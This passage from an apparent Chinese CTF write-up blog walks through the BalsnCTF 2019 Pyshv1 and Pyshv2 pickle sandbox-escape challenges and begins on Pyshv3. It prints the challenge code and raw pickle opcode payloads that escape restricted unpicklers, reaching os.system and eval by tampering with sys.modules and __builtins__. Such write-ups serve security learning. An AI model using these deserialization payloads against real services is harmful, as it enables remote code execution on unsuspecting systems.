class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> objdir:            </span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_&#x27;</span> == i[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">getattr</span>(obj, <span class="string">&#x27;__module__&#x27;</span>, <span class="literal">None</span>)!=<span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">getattr</span>(obj, <span class="string">&#x27;__module__&#x27;</span>, <span class="literal">None</span>).split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>] == django.__name__:</span><br><span class="line">                result+=get_dict(<span class="built_in">getattr</span>(obj,i,<span class="literal">None</span>),way+<span class="string">&quot;.&quot;</span>+i,depth+<span class="number">1</span>) </span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SECRET_KEY&quot;</span> <span class="keyword">in</span> objdir <span class="keyword">or</span> <span class="string">&quot;settings&quot;</span> <span class="keyword">in</span> objdir:</span><br><span class="line">        <span class="built_in">print</span>(way)</span><br><span class="line">        <span class="keyword">return</span> result+way+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>这次是真的易得了:),至此结束</p>
<h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;sys&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br></pre></td></tr></table></figure>

<p>只允许sys里的属性,而且属性里不能有.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;__displayhook__&#x27;, &#x27;__doc__&#x27;, &#x27;__excepthook__&#x27;, &#x27;__interactivehook__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;__stderr__&#x27;, &#x27;__stdin__&#x27;, &#x27;__stdout__&#x27;, &#x27;_clear_type_cache&#x27;, &#x27;_current_frames&#x27;, &#x27;_debugmallocstats&#x27;, &#x27;_getframe&#x27;, &#x27;_git&#x27;, &#x27;_home&#x27;, &#x27;_xoptions&#x27;, &#x27;abiflags&#x27;, &#x27;api_version&#x27;, &#x27;argv&#x27;, &#x27;base_exec_prefix&#x27;, &#x27;base_prefix&#x27;, &#x27;builtin_module_names&#x27;, &#x27;byteorder&#x27;, &#x27;call_tracing&#x27;, &#x27;callstats&#x27;, &#x27;copyright&#x27;, &#x27;displayhook&#x27;, &#x27;dont_write_bytecode&#x27;, &#x27;exc_info&#x27;, &#x27;excepthook&#x27;, &#x27;exec_prefix&#x27;, &#x27;executable&#x27;, &#x27;exit&#x27;, &#x27;flags&#x27;, &#x27;float_info&#x27;, &#x27;float_repr_style&#x27;, &#x27;get_asyncgen_hooks&#x27;, &#x27;get_coroutine_wrapper&#x27;, &#x27;getallocatedblocks&#x27;, &#x27;getcheckinterval&#x27;, &#x27;getdefaultencoding&#x27;, &#x27;getdlopenflags&#x27;, &#x27;getfilesystemencodeerrors&#x27;, &#x27;getfilesystemencoding&#x27;, &#x27;getprofile&#x27;, &#x27;getrecursionlimit&#x27;, &#x27;getrefcount&#x27;, &#x27;getsizeof&#x27;, &#x27;getswitchinterval&#x27;, &#x27;gettrace&#x27;, &#x27;hash_info&#x27;, &#x27;hexversion&#x27;, &#x27;implementation&#x27;, &#x27;int_info&#x27;, &#x27;intern&#x27;, &#x27;is_finalizing&#x27;, &#x27;last_traceback&#x27;, &#x27;last_type&#x27;, &#x27;last_value&#x27;, &#x27;maxsize&#x27;, &#x27;maxunicode&#x27;, &#x27;meta_path&#x27;, &#x27;modules&#x27;, &#x27;path&#x27;, &#x27;path_hooks&#x27;, &#x27;path_importer_cache&#x27;, &#x27;platform&#x27;, &#x27;prefix&#x27;, &#x27;ps1&#x27;, &#x27;ps2&#x27;, &#x27;set_asyncgen_hooks&#x27;, &#x27;set_coroutine_wrapper&#x27;, &#x27;setcheckinterval&#x27;, &#x27;setdlopenflags&#x27;, &#x27;setprofile&#x27;, &#x27;setrecursionlimit&#x27;, &#x27;setswitchinterval&#x27;, &#x27;settrace&#x27;, &#x27;stderr&#x27;, &#x27;stdin&#x27;, &#x27;stdout&#x27;, &#x27;thread_info&#x27;, &#x27;version&#x27;, &#x27;version_info&#x27;, &#x27;warnoptions&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>发现有个modules,但是loads那里有一个死亡raise</p>
<p><code> sys._getframe</code> 可以返回带有exec的字典,但是好像没啥用</p>
<p>现在问题是不知道如何取出modules里的值</p>
<p>阅读文档发现</p>
<blockquote>
<p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. </p>
</blockquote>
<p>可以修改modules来修改模块内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; import sys</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; sys.modules[<span class="string">&#x27;sys&#x27;</span>]=sys.modules</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; import sys</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; dir(sys)</span></span><br><span class="line">[&#x27;__class__&#x27;, &#x27;__contains__&#x27;, &#x27;__delattr__&#x27;, &#x27;__delitem__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__getitem__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__iter__&#x27;, &#x27;__le__&#x27;, &#x27;__len__&#x27;, &#x27;__lt__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__setitem__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;clear&#x27;, &#x27;copy&#x27;, &#x27;fromkeys&#x27;, &#x27;get&#x27;, &#x27;items&#x27;, &#x27;keys&#x27;, &#x27;pop&#x27;, &#x27;popitem&#x27;, &#x27;setdefault&#x27;, &#x27;update&#x27;, &#x27;values&#x27;]</span><br></pre></td></tr></table></figure>

<p>然后sys就被替换成sys.modules了,就可以拿到os了</p>
<p>然后再对sys.modules[‘sys’]再赋值为os</p>
<p>就可以import os了</p>
<p>(师傅们tql)</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">S&#x27;sys&#x27;</span><br><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">scsys</span><br><span class="line">get</span><br><span class="line">(S&#x27;os&#x27;</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">S&#x27;sys&#x27;</span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line">system</span><br><span class="line">(S&#x27;dir&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>





<h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 -u</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;structs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">&#x27;help&#x27;</span>: self.cmd_help,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Available commands: &#x27;</span> + <span class="string">&#x27; &#x27;</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>



<p>这次更骚了直接给了个空模块</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; dir(structs)</span></span><br><span class="line">[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;]</span><br></pre></td></tr></table></figure>



<p><code>__spec__,__loader__,__builtins__</code>是我们需要注意的</p>
<p>我们看一下操作码c(看重载后的find_class代码,看别人wp的时候没看重载后的find_class,然后连wp都看不懂了)的实现,发现调用了<code>__import__</code></p>
<p>在文档中发现</p>
<blockquote>
<p>此函数(<code>__import__</code>)会由 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义 </p>
</blockquote>
<p>而<code>__buiutins__</code>里面也有<code>__import__</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; structs.__builtins__[&#x27;__import__&#x27;]=eval</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: eval expected at most 3 arguments, got 5</span><br><span class="line">&gt;&gt;&gt; __import__(&#x27;print(123)&#x27;)</span><br><span class="line">123</span><br></pre></td></tr></table></figure>



<p>成功修改了<code>__import__</code></p>
<p>我们再看重载的find_class</p>
<p>securePickle.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        module = <span class="built_in">__import__</span>(module)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(module, name)</span><br><span class="line"><span class="comment">#一般重载都会改成if xxxx : raise xxxx else:  return pickle.Unpickler.find_class(self, module, name)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而原来的find_class是这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span>:</span></span><br><span class="line">    <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure>



<p>接着我们可以通过操作码c来实现一下操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">getattr</span>(<span class="built_in">__import__</span>(module), name)</span><br></pre></td></tr></table></figure>

<p>如果能令<code>__import__(module)</code>的返回值为<code>__builtins__</code>时,就可以取出<code>__builtins__</code>里的值</p>
<p>结合<a target="_blank" rel="noopener" href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id1">魔术方法</a><code>__getattribute__</code>便可以实现</p>
<p>于是构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bis=structs.__builtins__</span><br><span class="line">structs.__setattr__(<span class="string">&#x27;structs&#x27;</span>,bis)<span class="comment">#name只能为structs</span></span><br><span class="line">bis[<span class="string">&#x27;__import__&#x27;</span>]=structs.__getattribute__</span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;structs&quot;</span>),<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;eval&quot;</span>)(<span class="string">&quot;print(123)&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>对应的pickle代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__builtins__</span><br><span class="line">p100</span><br><span class="line">0cstructs</span><br><span class="line">__setattr__</span><br><span class="line">(S&#x27;structs&#x27;</span><br><span class="line">g100</span><br><span class="line">tRg100</span><br><span class="line">S&#x27;__import__&#x27;</span><br><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S&quot;eval&quot;</span><br><span class="line">tR(S&#x27;print(123)&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>







<h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><p>structs.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, group</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">&#x27;The pickle is spoilt :(&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br></pre></td></tr></table></figure>



<p>server.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">&#x27;structs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.key = os.urandom(<span class="number">100</span>)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">&#x27;help&#x27;</span>: self.cmd_help,</span><br><span class="line">            <span class="string">&#x27;whoami&#x27;</span>: self.cmd_whoami,</span><br><span class="line">            <span class="string">&#x27;su&#x27;</span>: self.cmd_su,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(self.key, flag))</span><br><span class="line">        user = <span class="built_in">input</span>().encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Login as &#x27;</span> + user.name + <span class="string">&#x27; - &#x27;</span> 